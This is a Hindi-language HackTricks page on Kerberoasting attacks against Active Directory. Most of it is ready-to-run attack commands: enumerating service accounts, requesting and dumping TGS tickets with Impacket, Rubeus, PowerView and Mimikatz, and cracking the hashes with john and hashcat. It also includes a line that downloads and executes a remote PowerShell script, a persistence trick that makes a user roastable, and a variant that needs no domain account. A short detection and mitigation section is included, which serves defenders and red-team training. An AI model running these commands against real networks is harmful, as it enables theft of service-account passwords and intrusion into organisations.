# Kerberoast

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) का उपयोग करें ताकि आप दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित **कार्यप्रवाहों** को आसानी से बना और **स्वचालित** कर सकें।\
आज ही एक्सेस प्राप्त करें:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमसे जुड़ें** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **हमारा अनुसरण करें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें, PRs को** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में सबमिट करके। 

</details>
{% endhint %}

## Kerberoast

Kerberoasting **TGS टिकटों** के अधिग्रहण पर केंद्रित है, विशेष रूप से उन सेवाओं से संबंधित जो **Active Directory (AD)** में **उपयोगकर्ता खातों** के तहत संचालित होती हैं, **कंप्यूटर खातों** को छोड़कर। इन टिकटों का एन्क्रिप्शन उन कुंजियों का उपयोग करता है जो **उपयोगकर्ता पासवर्ड** से उत्पन्न होती हैं, जिससे **ऑफलाइन क्रेडेंशियल क्रैकिंग** की संभावना होती है। एक सेवा के रूप में उपयोगकर्ता खाते का उपयोग एक गैर-खाली **"ServicePrincipalName"** प्रॉपर्टी द्वारा संकेतित किया जाता है।

**Kerberoasting** को निष्पादित करने के लिए, एक डोमेन खाता आवश्यक है जो **TGS टिकटों** का अनुरोध कर सके; हालाँकि, इस प्रक्रिया के लिए **विशेष विशेषाधिकार** की आवश्यकता नहीं होती है, जिससे यह किसी भी व्यक्ति के लिए **मान्य डोमेन क्रेडेंशियल्स** के साथ सुलभ हो जाता है।

### मुख्य बिंदु:

* **Kerberoasting** **AD** के भीतर **उपयोगकर्ता-खाता सेवाओं** के लिए **TGS टिकटों** को लक्षित करता है।
* **उपयोगकर्ता पासवर्ड** से प्राप्त कुंजियों के साथ एन्क्रिप्टेड टिकटों को **ऑफलाइन क्रैक** किया जा सकता है।
* एक सेवा को एक **ServicePrincipalName** द्वारा पहचाना जाता है जो शून्य नहीं है।
* **विशेष विशेषाधिकार** की आवश्यकता नहीं है, केवल **मान्य डोमेन क्रेडेंशियल्स**।

### **हमला**

{% hint style="warning" %}
**Kerberoasting उपकरण** आमतौर पर हमले को करते समय और TGS-REQ अनुरोध शुरू करते समय **`RC4 एन्क्रिप्शन`** का अनुरोध करते हैं। इसका कारण यह है कि **RC4** [**कमजोर**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) है और Hashcat जैसे उपकरणों का उपयोग करके अन्य एन्क्रिप्शन एल्गोरिदम जैसे AES-128 और AES-256 की तुलना में ऑफलाइन क्रैक करना आसान है।\
RC4 (प्रकार 23) हैश **`$krb5tgs$23$*`** से शुरू होते हैं जबकि AES-256 (प्रकार 18) **`$krb5tgs$18$*`** से शुरू होते हैं। 
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
मल्टी-फीचर्स टूल्स जिसमें kerberoastable उपयोगकर्ताओं का डंप शामिल है:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Kerberoastable उपयोगकर्ताओं की गणना करें**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **तकनीक 1: TGS के लिए पूछें और इसे मेमोरी से डंप करें**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **तकनीक 2: स्वचालित उपकरण**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
जब TGS का अनुरोध किया जाता है, Windows इवेंट `4769 - A Kerberos service ticket was requested` उत्पन्न होता है।
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) का उपयोग करें ताकि आप दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित **कार्यप्रवाहों** को आसानी से बना और **स्वचालित** कर सकें।\
आज ही एक्सेस प्राप्त करें:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### क्रैकिंग
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistence

यदि आपके पास एक उपयोगकर्ता पर **पर्याप्त अनुमतियाँ** हैं, तो आप इसे **kerberoastable** बना सकते हैं:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
आप उपयोगी **tools** **kerberoast** हमलों के लिए यहाँ पा सकते हैं: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

यदि आपको Linux से यह **error** मिलती है: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** तो यह आपके स्थानीय समय के कारण है, आपको होस्ट को DC के साथ समन्वयित करने की आवश्यकता है। कुछ विकल्प हैं:

* `ntpdate <IP of DC>` - Ubuntu 16.04 से हटा दिया गया
* `rdate -n <IP of DC>`

### Mitigation

Kerberoasting को उच्च स्तर की छिपाने की क्षमता के साथ किया जा सकता है यदि यह शोषणीय है। इस गतिविधि का पता लगाने के लिए, **Security Event ID 4769** पर ध्यान दिया जाना चाहिए, जो इंगित करता है कि एक Kerberos टिकट का अनुरोध किया गया है। हालाँकि, इस घटना की उच्च आवृत्ति के कारण, संदिग्ध गतिविधियों को अलग करने के लिए विशिष्ट फ़िल्टर लागू किए जाने चाहिए:

* सेवा नाम **krbtgt** नहीं होना चाहिए, क्योंकि यह एक सामान्य अनुरोध है।
* **$** के साथ समाप्त होने वाले सेवा नामों को शामिल करने से बचने के लिए बाहर रखा जाना चाहिए।
* मशीनों से अनुरोधों को **machine@domain** के रूप में स्वरूपित खाता नामों को बाहर करके फ़िल्टर किया जाना चाहिए।
* केवल सफल टिकट अनुरोधों पर विचार किया जाना चाहिए, जिन्हें **'0x0'** की विफलता कोड द्वारा पहचाना जाता है।
* **सबसे महत्वपूर्ण**, टिकट एन्क्रिप्शन प्रकार **0x17** होना चाहिए, जो अक्सर Kerberoasting हमलों में उपयोग किया जाता है।
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Kerberoasting के जोखिम को कम करने के लिए:

* सुनिश्चित करें कि **सेवा खाता पासवर्ड अनुमान लगाने में कठिन हैं**,  **25 वर्णों** से अधिक की लंबाई की सिफारिश की जाती है।
* **प्रबंधित सेवा खातों** का उपयोग करें, जो **स्वचालित पासवर्ड परिवर्तन** और **प्रतिनिधि सेवा प्रमुख नाम (SPN) प्रबंधन** जैसे लाभ प्रदान करते हैं, जो ऐसे हमलों के खिलाफ सुरक्षा को बढ़ाते हैं।

इन उपायों को लागू करके, संगठन Kerberoasting से संबंधित जोखिम को काफी हद तक कम कर सकते हैं।

## Kerberoast w/o domain account

**सितंबर 2022** में, एक शोधकर्ता चार्ली क्लार्क द्वारा एक प्रणाली का शोषण करने का एक नया तरीका उजागर किया गया, जिसे उनके प्लेटफॉर्म [exploit.ph](https://exploit.ph/) के माध्यम से साझा किया गया। यह विधि **KRB\_AS\_REQ** अनुरोध के माध्यम से **सेवा टिकट (ST)** प्राप्त करने की अनुमति देती है, जो आश्चर्यजनक रूप से किसी भी सक्रिय निर्देशिका खाते पर नियंत्रण की आवश्यकता नहीं होती है। मूल रूप से, यदि एक प्रमुख इस तरह से सेट किया गया है कि इसे पूर्व-प्रामाणिकता की आवश्यकता नहीं है—यह एक परिदृश्य है जो साइबर सुरक्षा क्षेत्र में **AS-REP रोस्टिंग हमले** के रूप में जाना जाता है—तो इस विशेषता का उपयोग अनुरोध प्रक्रिया में हेरफेर करने के लिए किया जा सकता है। विशेष रूप से, अनुरोध के शरीर के भीतर **sname** विशेषता को बदलकर, प्रणाली को **ST** जारी करने के लिए धोखा दिया जाता है, न कि मानक एन्क्रिप्टेड टिकट ग्रांटिंग टिकट (TGT)।

इस तकनीक को इस लेख में पूरी तरह से समझाया गया है: [Semperis ब्लॉग पोस्ट](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
आपको उपयोगकर्ताओं की एक सूची प्रदान करनी होगी क्योंकि हमारे पास इस तकनीक का उपयोग करके LDAP को क्वेरी करने के लिए कोई मान्य खाता नहीं है।
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## References

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{% hint style="success" %}
सीखें और AWS हैकिंग का अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
सीखें और GCP हैकिंग का अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमारा अनुसरण करें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) का उपयोग करें ताकि आप दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित **वर्कफ़्लो** को आसानी से बना और **स्वचालित** कर सकें।\
आज ही एक्सेस प्राप्त करें:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
